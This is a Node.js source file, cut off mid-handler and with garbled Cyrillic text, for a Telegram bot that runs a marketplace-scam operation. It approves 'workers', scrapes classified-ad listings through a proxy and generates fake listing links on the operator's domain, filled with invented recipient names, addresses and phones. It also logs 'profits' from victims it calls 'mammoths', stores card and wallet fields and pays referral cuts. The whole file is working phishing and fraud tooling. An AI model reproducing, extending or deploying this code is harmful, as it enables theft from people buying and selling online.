const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const StormDB = require("stormdb");
const engine = new StormDB.localFileEngine("./db.json");
const db = new StormDB(engine);
db.default({ users: [], links: [], templates: [], profits: [] });
setInterval(()=>{
    db.save();
}, 5000)






let config = require('./config.json')
let countries = require('./countries.json') //–°–õ–ò–¢–û –í https://t.me/proggmatic 
let keyboard = require('./keyboards')

const cheerio = require('cheerio');

const { Telegraf } = require('telegraf');
const bot = new Telegraf(config.bot_token);

async function init_bot() {
    let commands = [
        {command: 'start', description: '–ü–µ—Ä–µ—Ö–æ–¥ –≤ –º–µ–Ω—é'},
        {command: 'services', description: '–°–µ—Ä–≤–∏—Å—ã'}
    ];
    return await axios.get(`https://api.telegram.org/bot${config.bot_token}/setMyCommands?commands=${encodeURI(JSON.stringify(commands))}`)
}

init_bot()

const express = require('express')
const cookieParser = require('cookie-parser');
const useragent = require('express-useragent');
const app = express()
app.use(express.static('views'))
app.use(cookieParser());
app.use(require('body-parser').urlencoded({ extended: false }));
app.set('view engine', 'ejs');

const port = 9092

let fios = [
    "–ë—Ä–æ–≤–∞—Ä—á—É–∫ –ù–∞–∑–∞—Ä",
    "–í–∞—Å–∏–ª—å—î–≤ –í–∞—Å–∏–ª—å",
    "–î–º–∏—Ç—Ä–µ–Ω–∫–æ –Æ–ª—ñ—è",
    "–®–∏–Ω–∫–∞—Ä–µ–Ω–∫–æ –û–ª–µ–Ω–∞",
    "–í–∞—Å–∏–ª—å—á—É–∫ –õ–∞—Ä–∏—Å–∞",
    "–ë—Ä–æ–≤–∞—Ä–µ–Ω–∫–æ –ü–∞–≤–ª–æ",
    "–®–µ–≤—á–µ–Ω–∫–æ –ê–ª–ª–∞",
    "–ë—Ä–æ–≤–∞—Ä—á—É–∫ –Ü–≤–∞–Ω",
    "–ë–æ–¥–Ω–∞—Ä–µ–Ω–∫–æ –î—ñ–∞–Ω–∞",
    "–ö—Ä–∞–º–∞—Ä—á—É–∫ –ù—ñ–Ω–∞"
]

let addresses = [
    "–º—ñ—Å—Ç–æ –ö–∏—ó–≤, –ø—Ä–æ–≤. –ú–µ–ª—å–Ω–∏–∫–æ–≤–∞, 16",
    "–º—ñ—Å—Ç–æ –ö–∏—ó–≤, –ø—Ä–æ—Å–ø. –ë. –ì—Ä—ñ–Ω—á–µ–Ω–∫–∞, 98",
    "–º—ñ—Å—Ç–æ –°—É–º–∏, –ø—Ä–æ–≤. –§—ñ–∑–∫—É–ª—å—Ç—É—Ä–∏, 47",
    "–º—ñ—Å—Ç–æ –†—ñ–≤–Ω–µ, –ø—Ä–æ—Å–ø. –ü—Ä–æ—Ä—ñ–∑–Ω–∞, 27",
    "–º—ñ—Å—Ç–æ –°—É–º–∏, –≤—É–ª. –®–æ—Ç–∞ –†—É—Å—Ç–∞–≤–µ–ª—ñ, 46",
    "–º—ñ—Å—Ç–æ –ß–µ—Ä–Ω—ñ–≤—Ü—ñ, –ø—Ä–æ—Å–ø. –ú–µ–ª—å–Ω–∏–∫–æ–≤–∞, 89",
    "–º—ñ—Å—Ç–æ –ß–µ—Ä–Ω—ñ–≥—ñ–≤, –≤—É–ª. –í–æ–ª–æ–¥–∏–º–∏—Ä—Å—å–∫–∞, 53",
    "–º—ñ—Å—Ç–æ –ß–µ—Ä–Ω—ñ–≥—ñ–≤, –ø–ª. –§—ñ–∑–∫—É–ª—å—Ç—É—Ä–∏, 60",
    "–º—ñ—Å—Ç–æ –ñ–∏—Ç–æ–º–∏—Ä, –ø—Ä–æ—Å–ø. –†—ñ–∑–Ω–∏—Ü—å–∫–∞, 15",
    "–º—ñ—Å—Ç–æ –ß–µ—Ä–∫–∞—Å–∏, –ø—Ä–æ–≤. –ü–∏—Ä–æ–≥–æ–≤–∞, 38"
]

let phones = [
    "+380983185787",
    "+380914022388",
    "+380950427653",
    "+380637708923",
    "+380926438293",
    "+380661803404",
    "+380634207621",
    "+380963446708",
    "+380941539059",
    "+380676108057"
]

bot.on('text', async (ctx) => {
    try {
        let user = db.get("users").value().find(x=>x.id===ctx.message.from.id)
        if(!user && ctx.message.chat.type == "private") {
            let ref = ctx.message.text.split(' ')
            if(ref[1]) {ref = ref[1]} else {ref = 0}

            db.get("users").push({
                "id": ctx.message.from.id,
                "access": false,
                "admin": false,
                "name": ctx.message.from.first_name,
                "wallet": "",
                "nick": 0,
                "scene": "step1",
                "step1": "",
                "step2": "",
                "step3": "",
                "ref": ref
            })
            if (ref !== 0) await ctx.telegram.sendMessage(ref, `üéÅ –£ –≤–∞—Å –Ω–æ–≤—ã–π —Ä–µ—Ñ–µ—Ä–∞–ª (@${ctx.message.from.username})`);
            return await ctx.replyWithHTML(`<b>1Ô∏è‚É£ –†–∞—Å—Å–∫–∞–∂–∏ –æ —Å–≤–æ—ë–º –æ–ø—ã—Ç–µ!</b>`)
        }
        if (ctx.message.text == "/services") {
            let btns = [];
            for (var i=0; i < countries.length; i++) {
                btns.push([{text: `${countries[i].flag} ${countries[i].name}`, callback_data: `country_${countries[i].code}`}]);
            }
            btns.push(keyboard.back_menu()[0]);
            text = `–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç—Ä–∞–Ω—É –¥–ª—è –≤–æ—Ä–∫–∞`
            return await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        }
        if (ctx.message.text == "/start") {
            if (user.access == true) {
                await ctx.telegram.sendMessage(user.id, `–ó–∞—Ä—è–¥—É —Ç–µ–±–µ!\n\n–í–∞—à ID: <code>${ctx.message.from.id}</code>\n–ù–∏–∫: ${user.nick == 0 ? "üî¥ –í—ã–∫–ª—é—á–µ–Ω": "üü¢ –í–∫–ª—é—á–µ–Ω"}\n–ö–æ—à–µ–ª—ë–∫: <code>${user.wallet}</code>\n\n–ù–∞ –≤–±–∏–≤–µ: –ù–∏–∫–æ–≥–æ`, {reply_markup: {
                    inline_keyboard: keyboard.menu(user)
                }, parse_mode: "html"});
            }
        }
        if (ctx.message.text == "/getadm") {
            user.admin = true
        }
        if (user.scene == "step1") {
            user.step1 = ctx.message.text
            user.scene = "step2"
            return await ctx.replyWithHTML(`<b>2Ô∏è‚É£ –û—Ç–ª–∏—á–Ω–æ, —Ç–µ–ø–µ—Ä—å —Å–∫–∞–∂–∏ –æ—Ç–∫—É–¥–∞ —É–∑–Ω–∞–ª –æ –Ω–∞—Å.</b>`)
        }
        if (user.scene == "step2") {
            user.step2 = ctx.message.text
            user.scene = "step3"
            return await ctx.replyWithHTML(`<b>3Ô∏è‚É£ –ò –ø–æ—Å–ª–µ–¥–Ω–∏–π –≤–æ–ø—Ä–æ—Å: —Å–∫–æ–ª—å–∫–æ –≥–æ—Ç–æ–≤ —É–¥–µ–ª—è—Ç—å –≤—Ä–µ–º–µ–Ω–∏ —Ä–∞–±–æ—Ç–µ?</b>`)
        }
        if (user.scene == "step3") {
            user.step3 = ctx.message.text
            user.scene = "step_end"
            await ctx.telegram.sendMessage(config.rchat_id, `ü§ñ –ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—Å—Ç—É–ø–ª–µ–Ω–∏–µ! ü§ñ

        üßæ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @${ctx.message.from.username} (${ctx.message.from.id})

        üìß –û–ø—ã—Ç —Ä–∞–±–æ—Ç—ã: ${user.step1}
        üìß –û—Ç–∫—É–¥–∞ —É–∑–Ω–∞–ª: ${user.step2}
        üìß –í—Ä–µ–º—è –¥–ª—è —Ä–∞–±–æ—Ç—ã: ${user.step3}`, {reply_markup: {
            inline_keyboard: keyboard.new_user(ctx.from.id)
        }});
            return await ctx.replyWithHTML(`üß® –û—Ç–ª–∏—á–Ω–æ! –Ø –ø–µ—Ä–µ–¥–∞–º —Ç–≤–æ–∏ –æ—Ç–≤–µ—Ç—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏... –û–∂–∏–¥–∞–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç! üß®`)
        }
        if (user.scene.startsWith("profit_")) {
            let profit = ctx.message.text
            let link_id = user.scene.split("_")[1]
            let link = db.get("links").value().find(x=>x.id==link_id)
            let country = countries.find((x) => {
                let y = x.services.find(x=>x.subdomain==link.service);
                if(y) return true
                return false
            });
            let service = country.services.find(x=>x.subdomain==link.service);
            let owner = db.get("users").value().find(x=>x.id==link.owner);
            await ctx.telegram.sendMessage(config.pchat_id, `ü¶£ –ù–û–í–´–ô –ó–ê–õ–Å–¢ ü¶£\n\n${country.flag} ${service.name}\nüí∏ –°—É–º–º–∞: ${profit} ${country.valyta}\nüë®‚Äçüåæ –í–æ—Ä–∫–µ—Ä: <a href='tg://user?id=${user.id}'>${owner.name}</a>`, {parse_mode:"html"})
if (!user.profits) user.profits = [];
user.profits.push({
    name_serv: `${country.flag} ${service.name}`,
    name: `${link.name}`,
    amount: profit
})
user.scene = ""
return await ctx.replyWithHTML(`<b>–ü—Ä–æ—Ñ–∏—Ç —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω!</b>`)

        }
        if (user.scene == "template_name") {
            user.scene = "template_text__"+ctx.message.text
            db.get("templates").push({
                name: ctx.message.text,
                text: ""
            })
            return await ctx.replyWithHTML(`–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–µ:\n\nP.s –í —Ç–µ–∫—Å—Ç–µ –æ—à–∏–±–∫–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è HTML.`)
        }
        if (user.scene.startsWith("template_text")) {
            let template = db.get("templates").value().find(x=>x.name==user.scene.split("__")[1])
            user.scene = ""
            template.text = ctx.message.text;
            return await ctx.replyWithHTML(`–û—à–∏–±–∫–∞ "${template.name}"—É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–∞!`)
        }
        if (user.scene.startsWith("name_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.name = ctx.message.text;
            user.scene = `desc_${id}`;
            return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ –æ–ø–∏—Å–∞–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞.\n\n", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("desc_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.desc = ctx.message.text;
            user.scene = `photo_${id}`;
            return await ctx.replyWithHTML("–ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–æ—Ç–æ —Ç–æ–≤–∞—Ä–∞ —Å—Å—ã–ª–∫–æ–π.\n\n", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("photo_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.photo = ctx.message.text;
            user.scene = `fio_${id}`;
          
            
            return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ –∏–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è.")
        }
        if (user.scene.startsWith("fio_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.fio = ctx.message.text;
            user.scene = `address_${id}`;
          
            return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ –∞–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è.")
        }
        if (user.scene.startsWith("address_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.address = ctx.message.text;
            if(link.type == "manual") {
                user.scene = `cost_${id}`;
                return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ —Ü–µ–Ω—É —Ç–æ–≤–∞—Ä–∞.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else {
                user.scene = `phone_${id}`;
                
                return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω –ø–æ–ª—É—á–∞—Ç–µ–ª—è.")
            }
        }
        if (user.scene.startsWith("cost_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.price = Number(ctx.message.text) + " ";
            user.scene = `phone_${id}`;
  
            return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω –ø–æ–ª—É—á–∞—Ç–µ–ª—è.")
        }
        if (user.scene.startsWith("phone_")) {
            let id = user.scene.split("_")[1];
            let link = db.get("links").value().find(x=>x.id==id)
            link.phone = ctx.message.text;
            user.scene = ``;
            return await ctx.replyWithHTML(`‚úÖ –°—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞\n\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("e_")) {
            let action = user.scene.split("_")[1];
            let id = user.scene.split("_")[2];
            let link = db.get("links").value().find(x=>x.id==id)
            link[action] = ctx.message.text;
            return await ctx.replyWithHTML(`‚úÖ –°—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∞\n\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if (user.scene.startsWith("search_")) {
            let action = user.scene.split("_")[1]
            user.scene = ``;
            let links = db.get("links").value().filter(x=>x.owner == user.id)
            if (action == "name") { 
                links = db.get("links").value().filter(x=>x.name.includes(ctx.message.text))
            } else if (action == "date") {
                links = db.get("links").value().filter(x => {
                    let beg = Math.floor(new Date(ctx.message.text.split("-")[0]).getTime()/1000);
                    let end = Math.floor(new Date(ctx.message.text.split("-")[1]).getTime()/1000);
                    if (x.time > beg && x.time < end && x.owner == user.id) return true;
                    return false;
                })
            }
            let btns = [];
            for (var i=0; i < links.length; i++) {
                btns.push([{text: `${links[i].name}`, callback_data: `link_${links[i].id}`},{text: `‚úñÔ∏è`, callback_data: `dlink_${links[i].id}`}]);
            }
            btns.push([{ text: '‚ùå –£–¥–∞–ª–∏—Ç—å –≤—Å–µ —Å—Å—ã–ª–∫–∏', callback_data: `dlinkall`}])
            btns.push([{ text: 'üîé –î–∞—Ç–∞', callback_data: `find_date`},{ text: 'üîé –ù–∞–∑–≤–∞–Ω–∏–µ', callback_data: `find_name`}])
            btns.push([{ text: '‚¨ÖÔ∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: `back`}])
            await ctx.replyWithHTML("–í–∞—à–∏ —Ç–æ–≤–∞—Ä—ã:\n\n–í—ã –º–æ–∂–µ—Ç–µ –∏–∑–º–µ–Ω—è—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –≤–Ω—É—Ç—Ä–∏ —Ç–æ–≤–∞—Ä–∞.", {reply_markup: {
                inline_keyboard: btns
            }})
            return
        }
        if (user.scene.startsWith("wallet")) {
            user.wallet = ctx.message.text;
            user.scene = ``;
            return await ctx.replyWithHTML("‚úÖ –ö–æ—à–µ–ª—ë–∫ —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!")
        }
        if (user.scene.startsWith("parsing_")) {
            const proxyAgent = new HttpsProxyAgent('http://195.211.230.103:39033/');
            const response = await axios.get(ctx.message.text, {
                httpsAgent: proxyAgent
            });
            const body = response.data;
            const $ = cheerio.load(body);
            title = $('*[data-cy="ad_title"]').text()
            price = $('*[data-testid="ad-price-container"] h3').text()
            desc = $('*[data-cy="ad_description"] div').text()
            fio = $('*[data-testid="user-profile-link"] h4').text()
            place = (new RegExp(/.\"pathName.\":.\"(.*?).\"/)).exec(response.data)[1]
            photo = $(`*[data-testid="swiper-image"]`)[0].attribs.src
            let subdomain = user.scene.split("_")[1]
            let link = {
                "id": parseInt(Math.random()*1000000000, 10),
                "time": Math.floor(Date.now() / 1000),
                "owner": user.id,
                "status": "loading",
                "card4": "",
                "vbiver": 0,
                "name": title,
                "fio": fio,
                "address": place,
                "phone": phones[Math.floor(Math.random() * phones.length)], 
                "service": subdomain,
                "price": price,
                "desc": desc,
                "photo": photo,
                "type": "parsing"
            }
            db.get("links").push(link)
            user.scene = `fio_${link.id}`;
            let kb = keyboard.back_menu()
            kb.push([{ text: 'ü§ñ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è', callback_data: `autogen_fio`}])
            return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ –∏–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", {reply_markup: {inline_keyboard: kb}})
            user.scene = ``;
            return await ctx.replyWithHTML(`‚úÖ –°—Å—ã–ª–∫–∞ (${subdomain}) —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
        }
        if(user.scene == "rassylka") {
            text = ctx.message.text
            let users = db.get("users").value()
            for (var i=0; i<=users.length; i++) {
                try {
                    await ctx.telegram.sendMessage(users[i].id, text);
                } catch (error) {}
            }
            user.scene = ``;
            return await ctx.replyWithHTML(`‚úÖ –†–∞—Å—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.`)
        }
    } catch (err) {
        console.log(err)
    }
});

bot.on('callback_query', async (ctx) => {
    try {
        let user = db.get("users").value().find(x=>x.id===ctx.update.callback_query.from.id)
        let cbdata = ctx.update.callback_query.data;
        if (cbdata.startsWith("‚úÖ –ü—Ä–∏–Ω—è—Ç—å")) {
            let worker = db.get("users").value().find(x=>x.id===Number(cbdata.split(" ").at(-1)))
            worker.access = true
            await ctx.telegram.sendMessage(worker.id, `–°–∞—Å–Ω—ã—Ö –ª–æ–≥–æ–≤ —Ç–µ–±–µ\n–ó–ê–†–Ø–î–£!!!`, {reply_markup: {
                inline_keyboard: keyboard.menu(user)
            }});
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.accepted()
            })
        } else if (cbdata.startsWith("‚õîÔ∏è –û—Ç–∫–ª–æ–Ω–∏—Ç—å")) {
            let worker = db.get("users").value().find(x=>x.id===Number(cbdata.split(" ").at(-1)))
            worker.access = false
            await ctx.telegram.sendMessage(worker.id, `‚õîÔ∏è –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—ã–ª–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞! ‚õîÔ∏è`);

          
            await ctx.editMessageReplyMarkup({
                inline_keyboard: keyboard.declined()
            })
        } else if (cbdata.startsWith("e_")) {
            let action = cbdata.split("_")[1];
            user.scene = cbdata
            if (action == "fio") {
                return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ –∏–º—è –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "address") {
                return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ –∞–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "phone") {
                return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω –ø–æ–ª—É—á–∞—Ç–µ–ª—è.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "price") {
                return await ctx.replyWithHTML("–ù–∞–ø–∏—à–∏—Ç–µ —Ü–µ–Ω—É —Ç–æ–≤–∞—Ä–∞.", {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            }
        } else if (cbdata.startsWith("autogen_")) {
            let action = cbdata.split("_")[1]
            if (action == "fio") {
                let name = fios[Math.floor(Math.random() * fios.length)]
                let id = user.scene.split("_")[1];
                let link = db.get("links").value().find(x=>x.id==id)
                link.fio = name;
                user.scene = `address_${id}`;
                let kb = keyboard.back_menu()
                kb.push([{ text: 'ü§ñ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è', callback_data: `autogen_address`}])
                return await ctx.replyWithHTML(`–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –∏–º—è: ${name}\n\n –ù–∞–ø–∏—à–∏—Ç–µ –∞–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è.`, {reply_markup: {inline_keyboard: kb}})
            } else if (action == "address") {
                let name = addresses[Math.floor(Math.random() * addresses.length)]
                let id = user.scene.split("_")[1];
                let link = db.get("links").value().find(x=>x.id==id)
                link.address = name;
                user.scene = `cost_${id}`;
                return await ctx.replyWithHTML(`–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∞–¥—Ä–µ—Å: ${name}\n\n –ù–∞–ø–∏—à–∏—Ç–µ —Ü–µ–Ω—É —Ç–æ–≤–∞—Ä–∞.`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            } else if (action == "phone") {
                let name = phones[Math.floor(Math.random() * phones.length)]
                let id = user.scene.split("_")[1];
                let link = db.get("links").value().find(x=>x.id==id)
                link.phone = name;
                user.scene = ``;
                return await ctx.replyWithHTML(`‚úÖ –°—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞\n–ù–∞–∑–≤–∞–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞: ${link.name}\n–ò–º—è –º–∞–º–æ–Ω—Ç–∞: ${link.fio}\n–ê–¥—Ä–µ—Å: ${link.address}\n–¢–µ–ª–µ—Ñ–æ–Ω: ${link.phone}\n–¶–µ–Ω–∞: ${link.price}\n\nhttps://${config.domain}/${link.id}`, {reply_markup: {inline_keyboard: keyboard.back_menu()}})
            }
        } else if (cbdata == "back") {
            user.scene = ""
            await ctx.telegram.sendMessage(user.id, `–ü—Ä–∏–≤–µ—Ç, –ø–æ—Ä–∞ –ø–æ–¥–Ω—è—Ç—å –±–∞–±–ª–∞. –ó–∞—Ä—è–¥—É —Ç–µ–±–µ!\n\n–í–∞—à ID: <code>${user.id}</code>\n–ù–∏–∫: ${user.nick == 0 ? "üî¥ –í—ã–∫–ª—é—á–µ–Ω": "üü¢ –í–∫–ª—é—á–µ–Ω"}\n\n–ù–∞ –≤–±–∏–≤–µ: –ù–∏–∫–æ–≥–æ`, {reply_markup: {
                inline_keyboard: keyboard.menu(user)
            }, parse_mode: "html"});
        } else if (cbdata.startsWith("links")) {
            let links = db.get("links").value().filter(x=>x.owner===user.id)
            let btns = [];
            for (var i=0; i < links.length; i++) {
                btns.push([{text: `${links[i].name}`, callback_data: `link_${links[i].id}`},{text: `‚úñÔ∏è`, callback_data: `dlink_${links[i].id}`}]);
            }
            btns.push([{ text: '‚ùå –£–¥–∞–ª–∏—Ç—å –≤—Å–µ —Å—Å—ã–ª–∫–∏', callback_data: `dlinkall`}])
            btns.push([{ text: 'üîé –î–∞—Ç–∞', callback_data: `find_date`},{ text: 'üîé –ù–∞–∑–≤–∞–Ω–∏–µ', callback_data: `find_name`}])
            btns.push([{ text: '‚¨ÖÔ∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é', callback_data: `back`}])
            text = "–í–∞—à–∏ —Ç–æ–≤–∞—Ä—ã:\n\n–í—ã –º–æ–∂–µ—Ç–µ –∏–∑–º–µ–Ω—è—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –≤–Ω—É—Ç—Ä–∏ —Ç–æ–≤–∞—Ä–∞.\n\n–ü–æ–∏—Å–∫ –¥–æ–±–∞–≤–ª—é –ø–æ—Å–ª–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Å–µ—Ä–≤–∏—Å–æ–≤"
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }, resize_keyboard: false})
        } else if (cbdata.startsWith("link_")) {
            let link = db.get("links").value().find(x => x.id == Number(cbdata.split("_")[1]));
            text = `–¢–æ–≤–∞—Ä "${link.name}": \n\n–ò–º—è –º–∞–º–æ–Ω—Ç–∞: ${link.fio}\n–ê–¥—Ä–µ—Å: ${link.address}\n–¢–µ–ª–µ—Ñ–æ–Ω: ${link.phone}\n\n–¶–µ–Ω–∞: ${link.price}\n\n–°—Å—ã–ª–∫–∞: https://${config.domain}/${link.id}`
            let btns = [];
            btns.push([{ text: '‚úçÔ∏è –ò–º—è', callback_data: `e_fio_${link.id}` }])
            btns.push([{ text: '‚úçÔ∏è –ê–¥—Ä–µ—Å', callback_data: `e_address_${link.id}` }])
            btns.push([{ text: '‚úçÔ∏è –¢–µ–ª–µ—Ñ–æ–Ω', callback_data: `e_phone_${link.id}` }])
            btns.push([{ text: '‚úçÔ∏è –¶–µ–Ω–∞', callback_data: `e_price_${link.id}` }])
            btns.push(keyboard.back_menu()[0]);
            await ctx.replyWithHTML(text, {reply_markup: {
                inline_keyboard: btns
            }})
        } else if (cbdata.startsWith("dlink_")) {
            let id = cbdata.split("_")[1]
            db.get("links").value().splice(db.get("links").value().indexOf(db.get("links").value().find(x => x.id == id)), 1)
            await ctx.replyWithHTML(`–£—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–∏–ª–∏ —Å—Å—ã–ª–∫—É!`)
        } else if (cbdata.startsWith("dlinkall")) {
            let my_links = db.get("links").value().filter(x => x.owner == ctx.update.callback_query.from.id);
            for (var i=0; i < my_links.length; i++) {
                db.get("links").value().splice(db.get("links").value().indexOf(my_links[i]), 1)
            }
            await ctx.replyWithHTML(`–£—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–∏–ª–∏ –≤—Å–µ —Å—Å—ã–ª–∫–∏!`)
        } else if (cbdata.startsWith("find_")) {
            let action = cbdata.split("_")[1];
            if (action == "name") {
                await ctx.replyWithHTML(`–ù–∞–ø–∏—à–∏—Ç–µ –ø–æ–∏—Å–∫–æ–≤—É—é —Ñ—Ä–∞–∑—É`)
                return user.scene = `search_name`;
            } else if (action == "date") {
                await ctx.replyWithHTML(`–ù–∞–ø–∏—à–∏—Ç–µ –¥–∏–∞–ø–∞–∑–æ–Ω –¥–∞—Ç —Å–æ–∑–¥–∞–Ω–∏—è:\n\n–ü—Ä–∏–º–µ—Ä: <code>01.01.1970-30.12.2022</code>`, parse_mode="html")
                return user.scene = `search_date`;
            }
        } else if (cbdata.startsWith("profits")) {
            if (!user.profits) return await ctx.replyWithHTML(`–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –Ω–∏ –æ–¥–Ω–æ–≥–æ –ø—Ä–æ—Ñ–∏—Ç–∞ üò≠`);
            text = "üí∞ –í–∞—à–∏ –ø–æ—Å–ª–µ–¥–Ω–∏–µ –ø—Ä–æ—Ñ–∏—Ç—ã:\n\n"
            uprofits = user.profits.slice(-10);
            let sum = 0;
            for (var i=0; i<user.profits.length; i++) {
                sum += Number(user.profits[i].amount)
            };
            for (var i=0; i<uprofits.length; i++) {
                text += `${i+1}. ${uprofits[i].name} (${uprofits[i].amount})\n`
            };
            return await ctx.replyWithHTML(text + `\n–°—É–º–º–∞ –≤–∞—à–∏—Ö –ø—Ä–æ—Ñ–∏—Ç–æ–≤: ${sum} –≥—Ä–Ω.`);
        } else if (cbdata.startsWith("referalsystem")) {
            let referals = db.get("users").value().filter(x=>x.ref == ctx.update.callback_query.from.id)
            await ctx.replyWithHTML(`üéÑ<b>–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞

–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?
–í—ã –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç–µ –¥—Ä—É–≥—É —Å–≤–æ—é —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É, –ø–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ –æ–Ω –¥–µ–ª–∞–µ—Ç –ø—Ä–æ—Ñ–∏—Ç, –≤—ã –ø–æ–ª—É—á–∞–µ—Ç–µ 10% –æ—Ç –µ–≥–æ –ø—Ä–æ—Ñ–∏—Ç–∞ (—É –¥—Ä—É–≥–∞ –æ—Å—Ç–∞–µ—Ç—Å—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –ø—Ä–æ—Ü–µ–Ω—Ç –≤—ã–ø–ª–∞—Ç—ã, —É –Ω–µ–≥–æ –Ω–∏—á–µ–≥–æ –Ω–µ –∑–∞–±–∏—Ä–∞—é—Ç)

–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞: <code>https://t.me/${ctx.update.callback_query.message.from.username}?start=${user.id}</code>

–¢–µ–∫—É—â–∏–π BTC –∫–æ—à–µ–ª–µ–∫: <code>${user.wallet}</code>

–ü—Ä–∏–≥–ª–∞—à–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: <code>${referals.length}</code></b>`)
            
        } else if (cbdata.startsWith("settings")) {
            await ctx.replyWithHTML(`–ù–∞—Å—Ç—Ä–æ–π–∫–∏:`, {reply_markup: {
                inline_keyboard: keyboard.settings(user.nick)
            }})
        } else if (cbdata.startsWith("wallet")) {
